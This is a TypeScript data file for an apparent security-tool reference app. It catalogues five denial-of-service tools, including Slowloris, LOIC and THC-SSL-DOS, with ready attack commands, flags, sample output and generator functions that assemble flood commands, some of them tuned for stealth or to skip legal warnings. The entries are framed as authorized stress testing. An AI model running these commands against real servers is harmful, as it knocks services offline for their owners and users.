import type { Tool } from '../toolTypes';

export const denialOfServiceTools: Tool[] = [
  {
    id: 'slowloris',
    name: 'Slowloris',
    description: 'A highly targeted Denial of Service tool that holds many simultaneous HTTP connections to the target web server open as long as possible. It sends partial HTTP requests and never completes them, exhausting the server\'s connection pool with minimal bandwidth. A single laptop can take down an unprotected Apache server.',
    category: 'denial-of-service',
    difficulty: 'beginner',
    tags: ['dos', 'http', 'layer7', 'slow', 'apache'],
    commands: [
      { command: 'slowloris 192.168.1.100', description: 'Launch a basic Slowloris attack against a target web server' },
      { command: 'slowloris 192.168.1.100 -p 8080', description: 'Target a non-standard web port' },
      { command: 'slowloris 192.168.1.100 --sleeptime 15', description: 'Set the socket keep-alive sleep interval to 15 seconds (increase stealth)' },
      { command: 'slowloris 192.168.1.100 -s 500', description: 'Use 500 simultaneous sockets (default is 150)' },
      { command: 'slowloris 192.168.1.100 --https', description: 'Attack an HTTPS target (SSL/TLS-wrapped Slowloris)' },
      { command: 'slowloris 192.168.1.100 -s 1000 --sleeptime 5 -v', description: 'Aggressive mode: 1000 sockets, 5-second intervals, verbose output for full visibility' },
    ],
    whenToUse: [
      'During authorized DoS resilience testing on web servers to assess thread/connection exhaustion protection',
      'When evaluating if a server is protected by a timeout-based connection limiter or mod_reqtimeout',
      'To demonstrate to clients why unprotected web servers need proper connection rate limiting',
    ],
    commonFlags: [
      { flag: '-p', description: 'Target port (default: 80)' },
      { flag: '-s', description: 'Number of sockets to use in the attack (default: 150)' },
      { flag: '--sleeptime', description: 'Time to sleep between each header sent (default: 15 seconds)' },
      { flag: '-v', description: 'Verbose output showing socket status' },
      { flag: '--https', description: 'Use SSL/TLS-wrapped connections (for HTTPS targets)' },
    ],
    outputExample: [
      'Attacking 192.168.1.100 with 150 sockets...',
      'Creating sockets...',
      'Sending keep-alive headers... Socket count: 150',
      'Sending keep-alive headers... Socket count: 148',
      'Creating 2 new sockets...',
      'Sending keep-alive headers... Socket count: 150',
      '[Server is no longer responding — DoS successful]'
    ],
    relatedTools: ['goldeneye', 'loic', 'hping3'],
    installation: 'pip install slowloris   # or: sudo apt install slowloris -y',
    website: 'https://github.com/gkbrk/slowloris',
    interactiveCommands: [
      {
        name: 'Slowloris HTTP Exhaustion Builder',
        description: 'Generate advanced Slowloris DoS commands with precise socket, timing, and protocol controls.',
        inputs: [
          { id: 'target', label: 'Target Host/IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP or hostname' },
          { id: 'port', label: 'Port (-p)', type: 'text', defaultValue: '80', placeholder: 'Target port' },
          { id: 'sockets', label: 'Sockets (-s)', type: 'text', defaultValue: '150', placeholder: 'Simultaneous connections' },
          { id: 'sleeptime', label: 'Sleep Time (--sleeptime)', type: 'text', defaultValue: '15', placeholder: 'Seconds between headers' },
          { id: 'https', label: 'Use HTTPS (--https)', type: 'checkbox', defaultValue: 'false', placeholder: 'Attack over SSL/TLS' },
          { id: 'randomAgent', label: 'Random Agent (--randuseragent)', type: 'checkbox', defaultValue: 'true', placeholder: 'Randomize User-Agent' },
          { id: 'verbose', label: 'Verbose Output (-v)', type: 'checkbox', defaultValue: 'true', placeholder: 'Show socket count in CLI' }
        ],
        generator: (inputs) => {
          let cmd = `slowloris ${inputs.target} -p ${inputs.port} -s ${inputs.sockets}`;
          
          if (inputs.sleeptime && inputs.sleeptime !== '15') cmd += ` --sleeptime ${inputs.sleeptime}`;
          if (inputs.https === 'true') cmd += ' --https';
          if (inputs.randomAgent === 'true') cmd += ' --randuseragent';
          if (inputs.verbose === 'true') cmd += ' -v';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'goldeneye',
    name: 'GoldenEye',
    description: 'An HTTP/HTTPS Layer 7 Denial of Service testing tool. Sends high volumes of HTTP requests that keep connections alive (keep-alive) and demand responses from the target, effectively holding sessions open and exhausting available threads on Apache, IIS, and nginx.',
    category: 'denial-of-service',
    difficulty: 'beginner',
    tags: ['dos', 'http', 'layer7', 'web'],
    commands: [
      { command: 'python3 goldeneye.py http://192.168.1.100', description: 'Launch a basic GoldenEye attack against the target URL' },
      { command: 'python3 goldeneye.py http://192.168.1.100 -w 150', description: 'Use 150 concurrent workers/threads' },
      { command: 'python3 goldeneye.py https://192.168.1.100 -s 500', description: 'Use 500 concurrent connections against an HTTPS target' },
      { command: 'python3 goldeneye.py http://192.168.1.100 -m GET -p 500', description: 'Specify HTTP method (GET) and 500 connections per session' },
    ],
    whenToUse: [
      'During authorized web server stress testing to evaluate connection handling under load',
      'To check if a web server properly implements connection limits and request timeouts',
      'For demonstrating Layer 7 HTTP flood attack vectors to security teams',
    ],
    commonFlags: [
      { flag: '-w', description: 'Number of concurrent workers (default: 10)' },
      { flag: '-s', description: 'Number of sockets per worker (default: 500)' },
      { flag: '-m', description: 'HTTP method to use (GET/POST, default: random)' },
      { flag: '-d', description: 'Disable random URL parameter generation' },
    ],
    outputExample: [
      '[*] GoldenEye: Web Server DoS Testing Tool',
      '[*] Attacking: http://192.168.1.100/ with 150 workers, keep-alive: True',
      '[+] Starting 150 workers...',
      '[>] Hitting 192.168.1.100 with 50,000 req/s...',
      '[!] Target is responding with 503 Service Unavailable'
    ],
    relatedTools: ['slowloris', 'loic', 'siege'],
    installation: 'git clone https://github.com/jseidl/GoldenEye.git',
    website: 'https://github.com/jseidl/GoldenEye',
    interactiveCommands: [
      {
        name: 'GoldenEye Layer 7 Flooder',
        description: 'Construct powerful GoldenEye HTTP POST/GET flood commands to stress test web servers.',
        inputs: [
          { id: 'target', label: 'Target URL', type: 'text', defaultValue: 'http://192.168.1.100/', placeholder: 'Must include http(s)://' },
          { id: 'workers', label: 'Workers (-w)', type: 'text', defaultValue: '50', placeholder: 'Concurrent threads' },
          { id: 'sockets', label: 'Sockets/Worker (-s)', type: 'text', defaultValue: '500', placeholder: 'Connections per thread' },
          { id: 'method', label: 'HTTP Method (-m)', type: 'select', options: ['random', 'GET', 'POST'], defaultValue: 'random' },
          { id: 'nossl', label: 'Disable SSL Check (-n)', type: 'checkbox', defaultValue: 'true', placeholder: 'Ignore certificate errors' },
          { id: 'norandom', label: 'Disable Random URL (-d)', type: 'checkbox', defaultValue: 'false', placeholder: 'Static URL parameters only' }
        ],
        generator: (inputs) => {
          let cmd = `python3 goldeneye.py ${inputs.target}`;
          
          if (inputs.workers && inputs.workers !== '10') cmd += ` -w ${inputs.workers}`;
          if (inputs.sockets && inputs.sockets !== '500') cmd += ` -s ${inputs.sockets}`;
          if (inputs.method !== 'random') cmd += ` -m ${inputs.method}`;
          if (inputs.nossl === 'true') cmd += ' -n';
          if (inputs.norandom === 'true') cmd += ' -d';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'loic',
    name: 'LOIC (Low Orbit Ion Cannon)',
    description: 'An open-source network stress testing and Denial of Service attack application written in C#. Sends massive volumes of TCP, UDP, or HTTP packets to a target server. Originally designed for stress testing but became notorious for its use in hacktivist operations by Anonymous.',
    category: 'denial-of-service',
    difficulty: 'beginner',
    tags: ['dos', 'tcp', 'udp', 'flood', 'stress-test'],
    commands: [
      { command: 'loic.exe', description: 'Launch LOIC GUI — enter the target URL/IP, select method (TCP/UDP/HTTP), and click "IMMA CHARGIN MAH LAZER"' },
      { command: 'mono LOIC.exe /target:192.168.1.100 /method:UDP /port:80 /threads:100 /wait:false', description: 'Run LOIC from command line (Linux/macOS with Mono) for automated testing' },
    ],
    whenToUse: [
      'During authorized DoS stress testing to measure a server\'s raw packet flood tolerance',
      'For network device stress testing to validate rate limiting and DDoS protection hardware',
    ],
    commonFlags: [
      { flag: '/target', description: 'Target IP or URL' },
      { flag: '/method', description: 'Attack method: TCP, UDP, or HTTP' },
      { flag: '/port', description: 'Target port' },
      { flag: '/threads', description: 'Number of threads to use' },
      { flag: '/wait', description: 'Wait for response (true/false)' },
    ],
    outputExample: [
      'LOIC v1.0.8.0',
      'Attacking 192.168.1.100:80 using UDP',
      'Threads: 100',
      'Requested: 1,542,890',
      'Status: ATTACKING'
    ],
    relatedTools: ['hoic', 'goldeneye', 'hping3'],
    installation: 'Windows: Download the binary from GitHub. Linux: Use Mono runtime.',
    website: 'https://github.com/NewEraCracker/LOIC',
    interactiveCommands: [
      {
        name: 'LOIC CLI Automation',
        description: 'Generate automated LOIC commands for CLI-based stress testing without the GUI.',
        inputs: [
          { id: 'runtime', label: 'Runtime Environment', type: 'select', options: ['Windows (LOIC.exe)', 'Linux/macOS (mono LOIC.exe)'], defaultValue: 'Linux/macOS (mono LOIC.exe)' },
          { id: 'target', label: 'Target IP (/target)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP Address' },
          { id: 'port', label: 'Port (/port)', type: 'text', defaultValue: '80', placeholder: 'Target Port' },
          { id: 'method', label: 'Attack Method (/method)', type: 'select', options: ['TCP', 'UDP', 'HTTP'], defaultValue: 'UDP' },
          { id: 'threads', label: 'Threads (/threads)', type: 'text', defaultValue: '100', placeholder: 'Number of attack threads' },
          { id: 'wait', label: 'Wait for response (/wait)', type: 'checkbox', defaultValue: 'false', placeholder: 'Usually false for floods' }
        ],
        generator: (inputs) => {
          let cmd = inputs.runtime === 'Windows (LOIC.exe)' ? 'LOIC.exe' : 'mono LOIC.exe';
          
          cmd += ` /target:${inputs.target} /port:${inputs.port} /method:${inputs.method} /threads:${inputs.threads} /wait:${inputs.wait}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'hoic',
    name: 'HOIC (High Orbit Ion Cannon)',
    description: 'The successor to LOIC with significantly higher firepower. HOIC can bombard up to 256 URLs simultaneously and uses HTTP POST/GET floods. It features a "BOOSTER" plugin system that randomizes headers, user agents, and referrers to make traffic harder to filter.',
    category: 'denial-of-service',
    difficulty: 'beginner',
    tags: ['dos', 'http', 'flood', 'layer7'],
    commands: [
      { command: 'hoic.exe', description: 'Launch HOIC GUI — add target URLs, set power level, and load booster scripts' },
    ],
    whenToUse: [
      'During authorized Layer 7 DDoS simulation to test WAF and CDN DDoS protection effectiveness',
      'When you need to test if a web application can withstand high-volume HTTP flood attacks with randomized headers',
    ],
    commonFlags: [
      { flag: 'Power Level', description: 'Set attack intensity: LOW, MEDIUM, or HIGH' },
      { flag: 'Booster', description: 'Load a .hoic script to randomize User-Agent, Referer, and request parameters' },
    ],
    outputExample: [
      'HOIC v2.1.0',
      'Threads: 256',
      'Targets: 1',
      'Fire!',
      'Sending GET / HTTP/1.1',
      'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)',
      'Requests/s: 25,000'
    ],
    relatedTools: ['loic', 'goldeneye', 'slowloris'],
    installation: 'Windows only: Download binary. No Linux version available.',
    website: 'https://github.com/mehmet-offensive-security/HOIC',
    interactiveCommands: [
      {
        name: 'HOIC Configuration Generator',
        description: 'Generate parameters for running HOIC in high-volume denial of service tests.',
        inputs: [
          { id: 'executable', label: 'Executable', type: 'text', defaultValue: 'hoic.exe', placeholder: 'Path to hoic' },
          { id: 'target', label: 'Target URL', type: 'text', defaultValue: 'http://192.168.1.100', placeholder: 'Target URL' },
          { id: 'power', label: 'Power Level', type: 'select', options: ['LOW', 'MEDIUM', 'HIGH'], defaultValue: 'HIGH' },
          { id: 'threads', label: 'Threads', type: 'text', defaultValue: '256', placeholder: 'Number of attack threads' },
          { id: 'booster', label: 'Booster Script', type: 'text', defaultValue: 'GenericBoost.hoic', placeholder: 'Path to booster script' },
          { id: 'delay', label: 'Delay', type: 'text', defaultValue: '0', placeholder: 'Wait time in milliseconds' }
        ],
        generator: (inputs) => {
          // HOIC is largely GUI-based, but here we provide a generalized command abstraction
          let cmd = `${inputs.executable}`;
          cmd += ` [GUI NOTE: Target=${inputs.target}, Power=${inputs.power}, Threads=${inputs.threads}, Booster=${inputs.booster}]`;
          return cmd;
        }
      }
    ]
  },
  {
    id: 'thc-ssl-dos',
    name: 'THC-SSL-DOS',
    description: 'A proof-of-concept tool that exploits the SSL/TLS renegotiation feature to exhaust server CPU resources. Since renegotiation requires significantly more resources on the server side than the client side, a single attacker machine can overwhelm an HTTPS server. Effectively a computational DoS.',
    category: 'denial-of-service',
    difficulty: 'intermediate',
    tags: ['dos', 'ssl', 'tls', 'https', 'cpu-exhaustion'],
    commands: [
      { command: 'thc-ssl-dos 192.168.1.100 443', description: 'Launch SSL renegotiation attack against a target on port 443' },
      { command: 'thc-ssl-dos 192.168.1.100 443 --accept', description: 'Accept the legal warning and launch the attack' },
    ],
    whenToUse: [
      'To test if a web server has disabled SSL renegotiation (it should be disabled for security)',
      'During authorized penetration tests assessing HTTPS server DoS resilience',
    ],
    commonFlags: [
      { flag: '--accept', description: 'Accept the terms/warning and start the attack' },
      { flag: '-d', description: 'Disable SSL renegotiation check and force the attack' },
    ],
    relatedTools: ['slowloris', 'openssl'],
    installation: 'sudo apt install thc-ssl-dos -y',
    website: 'https://www.thc.org/thc-ssl-dos/',
    interactiveCommands: [
      {
        name: 'THC-SSL-DOS Attack Builder',
        description: 'Construct SSL/TLS renegotiation exhaustion attacks against target servers.',
        inputs: [
          { id: 'target', label: 'Target IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP address' },
          { id: 'port', label: 'Target Port', type: 'text', defaultValue: '443', placeholder: 'HTTPS port' },
          { id: 'accept', label: 'Accept Legal (--accept)', type: 'checkbox', defaultValue: 'true', placeholder: 'Auto-accept legal warning' },
          { id: 'disableCheck', label: 'Disable Reneg. Check (-d)', type: 'checkbox', defaultValue: 'true', placeholder: 'Force attack even if seemingly patched' },
          { id: 'threads', label: 'Parallel Threads (-l)', type: 'text', defaultValue: '400', placeholder: 'Max 400 connections' },
          { id: 'bindIp', label: 'Bind IP (-i)', type: 'text', defaultValue: '', placeholder: 'Local interface IP to bind to' }
        ],
        generator: (inputs) => {
          let cmd = 'thc-ssl-dos';
          
          if (inputs.accept === 'true') cmd += ' --accept';
          if (inputs.disableCheck === 'true') cmd += ' -d';
          if (inputs.threads && inputs.threads !== '400') cmd += ` -l ${inputs.threads}`;
          if (inputs.bindIp) cmd += ` -i ${inputs.bindIp}`;
          
          return `${cmd} ${inputs.target} ${inputs.port}`;
        }
      }
    ]
  },
];
